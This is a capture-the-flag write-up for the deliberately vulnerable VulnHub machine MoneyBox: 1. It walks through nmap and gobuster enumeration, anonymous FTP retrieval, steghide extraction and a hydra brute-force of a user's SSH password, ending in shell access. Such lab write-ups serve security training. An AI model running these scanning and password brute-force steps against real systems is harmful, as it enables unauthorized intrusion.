# MoneyBox: 1

- **Machine:** MoneyBox: 1
- **Download:** https://www.vulnhub.com/entry/moneybox-1,653/

![](789-1.png)

---

# Setup

1. Import the `.ova` file into VirtualBox.
2. Click **Finish**.
3. Start the virtual machine.

---

# Network Scanning

## Discover the Target IP

```bash
nmap -sn 192.168.2.0/24
```

![](789-2.png)

---

## Full Nmap Scan

Run a complete scan to identify open ports, services, operating system details, and NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.220
```

![](789-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.220
```

```bash
nmap -sC -sV -A 192.168.2.220
```

---

## HTTP Enumeration

Run the HTTP enumeration NSE script.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.220
```

---

# Web Enumeration

Visit the target website.

- http://192.168.2.220

---

## Directory Enumeration

Search for hidden directories.

```bash
gobuster dir -u http://192.168.2.220 -w /usr/share/wordlists/dirb/common.txt
```

![](789-4.png)

Discovered endpoint:

- http://192.168.2.220/blogs/

---

## Source Code Review

Inspect the page source.

![](789-5.png)

A hidden directory is discovered.

Visit:

- http://192.168.2.220/S3cr3t-T3xt/

Inspect its source code.

![](789-6.png)

Recovered secret string:

```text
3xtr4ctd4t4
```

This value will be useful during the next phase.

---

# FTP Enumeration

Login anonymously.

```bash
ftp 192.168.2.220
```

List available files.

```bash
ls
```

Download the image.

```bash
get trytofind.jpg
```

![](789-7.png)

---

## Steganography

Extract hidden data from the image using the password recovered earlier.

```bash
steghide extract -sf trytofind.jpg
```

![](789-8.png)

A hidden file named **data.txt** is extracted.

Read its contents.

```bash
cat data.txt
```

![](789-9.png)

The extracted file provides information about a system user.

---

# SSH Access

Brute-force the SSH password for the discovered user.

```bash
hydra -l renu -P /opt/rockyou.txt ssh://192.168.2.220
```

![](789-10.png)

Recovered credentials:

```text
Username : renu
Password : 987654321
```

---

# SSH Login

Connect to the target.

```bash
ssh renu@192.168.2.220
```

![](789-11.png)

Successfully obtained an interactive SSH shell.

---

# Key Learning

- Enumerate hidden directories using Gobuster.
- Always inspect HTML source code for hidden information.
- Anonymous FTP access may expose sensitive files.
- Use **Steghide** to extract hidden data from images.
- Combine clues from multiple services during enumeration.
- Hydra can efficiently recover weak SSH passwords.

---

# Summary

The attack began with web enumeration, which revealed a hidden directory containing the password required to extract data from an image hosted on the anonymous FTP server. Using **Steghide**, a hidden file was recovered that identified a valid system user. Hydra was then used to brute-force the user's SSH password, allowing successful SSH access to the target machine.